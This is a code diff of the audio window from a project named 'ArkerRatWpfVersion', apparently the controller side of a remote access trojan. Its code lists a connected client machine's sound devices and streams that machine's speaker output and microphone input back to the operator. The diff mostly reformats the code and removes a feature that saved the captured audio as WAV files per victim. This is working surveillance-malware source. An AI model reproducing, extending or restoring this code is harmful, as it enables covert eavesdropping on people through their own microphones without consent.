@@ -1,12 +1,16 @@
 ﻿using Microsoft.Win32;
+using NAudio.Mixer;
 using NAudio.Wave;
 using NAudio.Wave.SampleProviders;
 using System;
+using System.Collections;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Data.SqlTypes;
 using System.IO;
 using System.Linq;
+using System.Linq.Expressions;
+using System.Runtime.InteropServices.ComTypes;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -33,10 +37,10 @@ namespace ArkerRatWpfVersion
             clientSession = session;
             audioLog.IsReadOnly = true;
             audioLog.Document.Blocks.Clear();
-            audioLog.AppendText("OBS not chosing file saving path, will cause the program to create a new folder within the Arker folder\n\n");
+            audioLog.AppendText("Note by not chosing file saving path, will cause the program to create a new folder within the Arker folder\n\n");
             windowText.Content += " - " + clientSession.clientInfo[0];
             clientSession.SendData("§RemoteAudioStart§§RemoteAudioEnd§");
-            
+
             OutputSoundDeviceList.Items.Add("none");
             InputSoundDeviceList.Items.Add("none");
 
@@ -47,8 +51,8 @@ namespace ArkerRatWpfVersion
             InputSoundDeviceList.SelectionChanged += SendInputDeviceChoice;
 
 
-            outVolume.Minimum= 0;
-            outVolume.Maximum= 1;
+            outVolume.Minimum = 0;
+            outVolume.Maximum = 1;
             inVolume.Minimum = 0;
             inVolume.Maximum = 1;
 
@@ -59,7 +63,7 @@ namespace ArkerRatWpfVersion
 
             GlobalVariables.byteSize = 262144;
 
-            
+
         }
 
         bool close = false;
@@ -83,7 +87,7 @@ namespace ArkerRatWpfVersion
             close = true;
 
             receiveOAudio = false;
-            receiveIAudio= false;
+            receiveIAudio = false;
 
 
             try
@@ -100,7 +104,7 @@ namespace ArkerRatWpfVersion
             catch (Exception) { }
 
 
-            
+
 
             Close();
         }
@@ -123,7 +127,7 @@ namespace ArkerRatWpfVersion
             }
         }
 
-        Dictionary<string,string> friendlynameTodeviceId= new Dictionary<string,string>();
+        Dictionary<string, string> friendlynameTodeviceId = new Dictionary<string, string>();
         public void AddODevices(string devices)
         {
             string[] tempArray = devices.Split(',');
@@ -153,20 +157,20 @@ namespace ArkerRatWpfVersion
 
             receiveOAudio = false;
 
-            if(ReceiveOATask!=null)
-            Task.WaitAll(ReceiveOATask);
+            if (ReceiveOATask != null)
+                Task.WaitAll(ReceiveOATask);
 
             ComboBox comboBox = (ComboBox)e.Source;
             string device = comboBox.SelectedItem.ToString();
 
-            if(device == "none")
+            if (device == "none")
             {
                 await clientSession.SendData("§RemoteAudioStart§§ODS§§RemoteAudioEnd§");
                 audioLog.AppendText("Output-audio from client is set to none. No audio will be received\n\n");
             }
             else
             {
-                receiveOAudio= true;
+                receiveOAudio = true;
                 ReceiveOATask = Task.Run(() => ReceiveDecodeAndPlayClientOutputAudio());
 
                 await clientSession.SendData("§RemoteAudioStart§§ODS§" + friendlynameTodeviceId[device] + "§RemoteAudioEnd§");
@@ -184,8 +188,8 @@ namespace ArkerRatWpfVersion
 
             receiveIAudio = false;
 
-            if(ReceiveIATask!= null)
-            Task.WaitAll(ReceiveIATask);
+            if (ReceiveIATask != null)
+                Task.WaitAll(ReceiveIATask);
 
             ComboBox comboBox = (ComboBox)e.Source;
             string device = comboBox.SelectedItem.ToString();
@@ -199,7 +203,7 @@ namespace ArkerRatWpfVersion
             {
                 receiveIAudio = true;
 
-                ReceiveIATask = Task.Run(() =>ReceiveDecodeAndPlayClientInputAudio());
+                ReceiveIATask = Task.Run(() => ReceiveDecodeAndPlayClientInputAudio());
 
                 await clientSession.SendData("§RemoteAudioStart§§IDS§" + friendlynameTodeviceId[device] + "§RemoteAudioEnd§");
                 audioLog.AppendText("Receiving input-audio from client\n\n");
@@ -216,8 +220,8 @@ namespace ArkerRatWpfVersion
         private BufferedWaveProvider cOWaveProvider = new BufferedWaveProvider(new WaveFormat(41100, 1));
         private BufferedWaveProvider cIWaveProvider = new BufferedWaveProvider(new WaveFormat(41100, 1));
 
-       private bool receiveOAudio= false;
-       private bool receiveIAudio = false;
+        private bool receiveOAudio = false;
+        private bool receiveIAudio = false;
 
         private Task ReceiveOATask;
         private Task ReceiveIATask;
@@ -244,18 +248,16 @@ namespace ArkerRatWpfVersion
                 await Application.Current.Dispatcher.InvokeAsync(() => waveOutEvent.Volume = Convert.ToSingle(inVolume.Value));
 
                 string temp = string.Empty;
-                if(iAudioQue.TryDequeue(out temp))
+                if (iAudioQue.TryDequeue(out temp))
                 {
                     byte[] soundData = Convert.FromBase64String(temp);
 
 
-                    //If recording
-                    if (record)
-                    {
-                        await audioInputMemoryStream.WriteAsync(soundData, 0, soundData.Length);
-                    }
+
 
                     cIWaveProvider.AddSamples(soundData, 0, soundData.Length);
+
+
 
                 }
 
@@ -275,6 +277,7 @@ namespace ArkerRatWpfVersion
             waveOutEvent.DeviceNumber = 0;
 
             waveOutEvent.Play();
+
             while (!clientSession.source.IsCancellationRequested && !close && receiveOAudio)
             {
                 if (iAudioQue.Count > 10)
@@ -290,15 +293,10 @@ namespace ArkerRatWpfVersion
                 {
                     byte[] soundData = Convert.FromBase64String(temp);
 
-                    //If recording
-                    if (record)
-                    {
-                        await audioOutputMemoryStream.WriteAsync(soundData, 0, soundData.Length);
-                    }
+
 
                     cOWaveProvider.AddSamples(soundData, 0, soundData.Length);
 
-                    
                 }
 
                 await Task.Delay(10);
@@ -320,188 +318,9 @@ namespace ArkerRatWpfVersion
             }
         }
 
-        MemoryStream audioOutputMemoryStream = new MemoryStream();
-        MemoryStream audioInputMemoryStream = new MemoryStream();
-
-        bool record = false;
-        private async void recordButton_Click(object sender, RoutedEventArgs e)
-        {
-            
-                record = !record;
-
-                if (record)
-                {
-                audioLog.AppendText("Started recording audio\n\n");
-
-                recordButton.Content = "Stop recording";
-
-                    await StartTimerAsync();
-                }
-                else
-                {
-                await Application.Current.Dispatcher.InvokeAsync(() =>
-                {
-                    audioLog.AppendText("Stoped recording audio, recording saved at:"+path+"\n\n");
-
-
-                    recordButton.Content = "Start recording";
-                    recordButton.IsEnabled = false;
-                    SaveAudioRecording();
-                });
-
-            }
-
-        }
-        Timer timer;
-        private async Task StartTimerAsync()
-        {
-             timer= new Timer(TimerElapsed, null, TimeSpan.FromMinutes(5), Timeout.InfiniteTimeSpan);
-            await Task.Delay(Timeout.Infinite);
-        }
-
-        private void TimerElapsed(object state)
-        {
-            recordButton_Click(null, null);
-        }
-
-        string path = string.Empty;
-        private void SaveAudioRecording()
-        {
-            timer.Dispose();
-            if (string.IsNullOrEmpty(path))
-            {
-                path = Directory.GetCurrentDirectory() + "\\AudioRecordings_"+clientSession.clientInfo[0];
-                Directory.CreateDirectory(path);
-            }
-
-            List<byte[]> audioChunks = new List<byte[]>();
-
-            foreach (var stream in new MemoryStream[] { audioOutputMemoryStream, audioInputMemoryStream })
-            {
-                stream.Position = 0;
-                if (stream != null && stream.Length > 0 && stream.Position < stream.Length)
-                {
-                    audioChunks.Add(stream.ToArray());
-                }
-            }
-
-            string outputFilePath = System.IO.Path.Combine(path, "audio_recording" + Directory.EnumerateFiles(path).Count().ToString() + ".wav");
-
-            using (var fileStream = new FileStream(outputFilePath, FileMode.Create))
-            {
-                // Write the WAV header
-                WriteWavHeader(fileStream, audioChunks.Sum(chunk => chunk.Length));
-
-                // Concatenate and write the audio data
-                foreach (var chunk in audioChunks)
-                {
-                    fileStream.Write(chunk, 0, chunk.Length);
-                }
-            }
-
-            recordButton.IsEnabled = true;
-        }
-
-        private void WriteWavHeader(Stream stream, int audioDataSize)
-        {
-            using (var writer = new BinaryWriter(stream, Encoding.UTF8, true))
-            {
-                writer.Write(Encoding.ASCII.GetBytes("RIFF"));
-                writer.Write(audioDataSize + 36); // Total file size - 8 bytes
-                writer.Write(Encoding.ASCII.GetBytes("WAVE"));
-                writer.Write(Encoding.ASCII.GetBytes("fmt "));
-                writer.Write(16); // Length of format data
-                writer.Write((ushort)1); // PCM format
-                writer.Write((ushort)1); // Not Stereo
-                writer.Write(41100); // Sample rate
-                writer.Write(82200); // Byte rate (Sample rate * Channels * BitsPerSample / 8)
-                writer.Write((ushort)4); // Block align (Channels * BitsPerSample / 8)
-                writer.Write((ushort)16); // Bits per sample
-                writer.Write(Encoding.ASCII.GetBytes("data"));
-                writer.Write(audioDataSize); // Size of audio data
-            }
-        }
-
-
-
-
-        private void choseDirectory_Click(object sender, RoutedEventArgs e)
-        {
-            System.Windows.Forms.FolderBrowserDialog whereToSaveFile = new System.Windows.Forms.FolderBrowserDialog();
-
-            whereToSaveFile.Description = "Select a folder to save the file";
-
-            System.Windows.Forms.DialogResult result = whereToSaveFile.ShowDialog();
-
-            if (result == System.Windows.Forms.DialogResult.OK)
-            {
-                path = whereToSaveFile.SelectedPath;
-            }
-        }
-private class AudioRecorder
-    {
-        private MixingSampleProvider mixProvider;
-        private List<byte[]> channel1Chunks;
-        private List<byte[]> channel2Chunks;
-        private WaveFormat waveFormat;
-
-        public AudioRecorder(int sampleRate, int channels)
-        {
-            waveFormat = new WaveFormat(sampleRate, channels);
-            mixProvider = new MixingSampleProvider(waveFormat);
-            channel1Chunks = new List<byte[]>();
-            channel2Chunks = new List<byte[]>();
-        }
-
-        public void AddChannel1Chunk(byte[] chunk)
-        {
-            channel1Chunks.Add(chunk);
-        }
-
-        public void AddChannel2Chunk(byte[] chunk)
-        {
-            channel2Chunks.Add(chunk);
-        }
-
-        public void SaveMixedAudio(string outputPath)
-        {
-            var channel1Stream = CreateStreamFromChunks(channel1Chunks);
-            var channel2Stream = CreateStreamFromChunks(channel2Chunks);
-
-            var channel1Provider = new RawSourceWaveStream(channel1Stream, waveFormat).ToSampleProvider();
-            var channel2Provider = new RawSourceWaveStream(channel2Stream, waveFormat).ToSampleProvider();
-
-            mixProvider.AddMixerInput(channel1Provider);
-            mixProvider.AddMixerInput(channel2Provider);
-
-            WaveFileWriter.CreateWaveFile(outputPath, mixProvider.ToWaveProvider());
-            ClearAudioChunks();
-        }
-
-        private Stream CreateStreamFromChunks(List<byte[]> chunks)
-        {
-            var outputStream = new MemoryStream();
-            foreach (var chunk in chunks)
-            {
-                outputStream.Write(chunk, 0, chunk.Length);
-            }
-            outputStream.Position = 0;
-            return outputStream;
-        }
-
-        public void ClearAudioChunks()
-        {
-            channel1Chunks.Clear();
-            channel2Chunks.Clear();
-            mixProvider = new MixingSampleProvider(waveFormat);
-        }
-    }
-
         private void audioLog_TextChanged(object sender, TextChangedEventArgs e)
         {
             audioLog.ScrollToEnd();
         }
     }
-
-
 }
